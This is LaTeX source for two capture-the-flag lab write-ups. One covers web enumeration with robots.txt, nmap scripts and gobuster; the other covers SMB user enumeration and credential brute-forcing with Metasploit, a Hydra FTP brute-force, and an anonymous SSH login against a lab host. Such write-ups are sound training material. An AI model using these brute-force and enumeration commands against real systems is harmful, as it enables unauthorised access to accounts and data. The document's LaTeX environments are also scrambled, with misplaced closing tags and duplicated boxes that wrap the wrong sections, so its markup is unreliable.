\chapter{CTF 1 --- Information Gathering}
\label{ctf:ctf1}

\begin{notebox}[Target overview]
Black-box assessment of a web application. Goal: find all flags hidden across
the web server using only information gathering and passive/active enumeration
techniques.
\end{notebox}

% ─────────────────────────────────────────────────────────────────────────────
\section*{Attack Path Overview}

\begin{enumerate}
  \item Check \ic{robots.txt} for hidden paths
  \item Enumerate subdomains
  \item Directory brute-force with gobuster
  \item Look for PHP files and other entry points
  \item Use nmap script scanning for deep discovery
  \item Attempt login on any open service ports
\end{enumerate}

% ─────────────────────────────────────────────────────────────────────────────
\section*{Flag 1 --- robots.txt}



\begin{termbox}
# Always start here
curl http://target.ine.local/robots.txt
\end{termbox}

\begin{notebox}[Target overview]

\textbf{What I found:} robots.txt listed directories the site was trying to
hide from search engines. Flag 1 was sitting in one of those directories ---
accessible directly in the browser without any authentication.

\screenshot{assets/images/Screenshot_2026-04-11_at_10.47.32_AM.png}{robots.txt revealing hidden directories including the flag location}

\begin{takebox}
\textbf{Lesson:} robots.txt is the easiest win in web CTFs. It is literally a
list of ``things we don't want people to find'' --- which means it is the first
thing I look at on any web target.
\end{takebox}

% ─────────────────────────────────────────────────────────────────────────────
\section*{Flag 2 --- nmap Script Scan}

\end{notebox}

\begin{termbox}
nmap -sC -sV target.ine.local
\end{termbox}

\begin{takebox}

Running the default NSE scripts revealed additional information that pointed to
a second flag location.

\screenshot{assets/images/Screenshot_2026-04-11_at_10.47.46_AM.png}{nmap -sC -sV results revealing the path to flag 2}

\begin{takebox}
\textbf{Lesson:} \ic{-sC} runs scripts that do much more than just check open
ports. On web targets it discovers directories, enumerates common paths, and
sometimes reveals sensitive information directly in the output.
\end{takebox}

% ─────────────────────────────────────────────────────────────────────────────
\section*{Flag 3 --- WordPress Directory Brute-Force}

\begin{termbox}
# WordPress detected from nmap output
gobuster dir -u http://target.ine.local/wp-content \
  -w /usr/share/dirb/wordlists/common.txt
\end{termbox}

Gobuster found additional directories within the WordPress installation. Flag 3
was inside one of the discovered paths.

\screenshot{assets/images/Screenshot_2026-04-11_at_11.23.22_AM.png}{gobuster finding hidden WordPress directories containing flag 3}

\begin{takebox}
\textbf{Lesson:} When WordPress is detected, always brute-force \ic{/wp-content/}
separately. The main site might look empty but plugins and uploads directories
often contain sensitive content.
\end{takebox}

% ─────────────────────────────────────────────────────────────────────────────
\section*{Flags Summary}

\begin{checkbox}
\begin{itemize}
  \item[$\checkmark$] \textbf{Flag 1} --- Found via \ic{robots.txt}
  \item[$\checkmark$] \textbf{Flag 2} --- Found via \ic{nmap -sC} script output
  \item[$\checkmark$] \textbf{Flag 3} --- Found via gobuster on WordPress
        \ic{/wp-content/}
\end{itemize}
\end{checkbox}

\chapter{CTF 2 --- Network Enumeration \& SMB}
\label{ctf:ctf2}

\begin{notebox}[Target overview]
Multi-flag network CTF targeting SMB, FTP, and SSH services. Each flag requires
progressively deeper enumeration --- earlier flags leave hints for the next one.
\end{notebox}

% ─────────────────────────────────────────────────────────────────────────────
\section*{Attack Path Overview}

\begin{enumerate}
  \item Port scan to identify open services
  \item Enumerate SMB users and brute-force credentials
  \item Use smbclient to access shares and retrieve flag
  \item Follow the hint inside the flag for the next service
  \item Brute-force FTP using a specific user list
  \item SSH anonymous login attempt
\end{enumerate}

% ─────────────────────────────────────────────────────────────────────────────
\section*{Flag 1 --- SMB Null Session and Share Access}

\end{takebox}



\begin{termbox}
# Find SMB on port 445
nmap -sV -p 445 target.ine.local

# Enumerate SMB users
msfconsole
use auxiliary/scanner/smb/smb_enumusers
set RHOSTS target.ine.local
run

# Brute-force SMB with found users
use auxiliary/scanner/smb/smb_login
set RHOSTS target.ine.local
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set VERBOSE false
run

# Connect with found credentials using smbclient protocol flags
# (SMBv2/3 required on this target)
smbclient --option='client min protocol=SMB2' \
          --option='client max protocol=SMB3' \
          -L //target.ine.local -U found_user

# Access the share
smbclient --option='client min protocol=SMB2' \
          --option='client max protocol=SMB3' \
          //target.ine.local/share_name -U found_user

# Inside smbclient:
ls
get flag.txt
exit
cat flag.txt
\end{termbox}

\begin{checkbox}

\begin{takebox}

\begin{notebox}[SMB protocol version flags]
Some targets only respond to SMBv2 or SMBv3. If \ic{smbclient} connects
without the \ic{--option} flags and the connection hangs or fails, add the
\ic{client min/max protocol} options to force the correct version.
\end{notebox}

\screenshot{assets/images/Screenshot_2025-12-15_at_6.36.50_AM.png}{smbclient connecting with SMBv2/3 options and listing the share}

\screenshot{assets/images/Screenshot_2025-12-15_at_8.13.57_AM.png}{flag.txt downloaded from SMB share}

% ─────────────────────────────────────────────────────────────────────────────
\section*{Flag 2 --- FTP Brute-Force Using Hint from Flag 1}

Flag 1 contained a hint pointing to specific usernames related to FTP. I built
a custom user list from the hint and brute-forced FTP.

\end{takebox}

\begin{termbox}
# Create user list from names in the hint
echo "username1" > /root/user.txt
echo "username2" >> /root/user.txt

# Brute-force FTP (note: non-standard port 5554)
hydra -L /root/user.txt \
      -P /root/Desktop/wordlists/unix_passwords.txt \
      ftp://target.ine.local -s 5554

# Login with found credentials
ftp target.ine.local 5554
# Enter username and password at prompt
ls
get flag2.txt
exit
cat flag2.txt
\end{termbox}

\begin{notebox}[SMB protocol version flags]

\begin{notebox}
FTP may not respond immediately after Hydra finishes brute-forcing. The service
rate-limits connections briefly. Wait a moment before manually connecting.
\end{notebox}

% ─────────────────────────────────────────────────────────────────────────────
\section*{Flag 3 --- SSH Anonymous Login}

\begin{termbox}
# SSH was visible on port 22 from initial scan
# Brute-force attempt failed --- too many attempts or lockout

# Try anonymous login
ssh anonymous@target.ine.local

# Flag was embedded in the SSH warning/banner message displayed on login
\end{termbox}

The flag was inside the SSH warning message displayed when logging in. No
authentication required for the anonymous account --- the flag was literally
in the banner.

\begin{takebox}
\textbf{Lesson:} When brute-force fails on SSH, try \ic{anonymous} login.
Some systems display a banner with a message before authenticating, and in
CTFs that message sometimes contains the flag or a useful hint.
\end{takebox}

% ─────────────────────────────────────────────────────────────────────────────
\section*{Flags Summary}

\begin{checkbox}
\begin{itemize}
  \item[$\checkmark$] \textbf{Flag 1} --- SMB share access with brute-forced credentials
  \item[$\checkmark$] \textbf{Flag 2} --- FTP brute-force using hint from flag 1
        (non-standard port 5554)
  \item[$\checkmark$] \textbf{Flag 3} --- SSH anonymous login banner message
\end{itemize}
\end{checkbox}

\end{notebox}
\end{checkbox}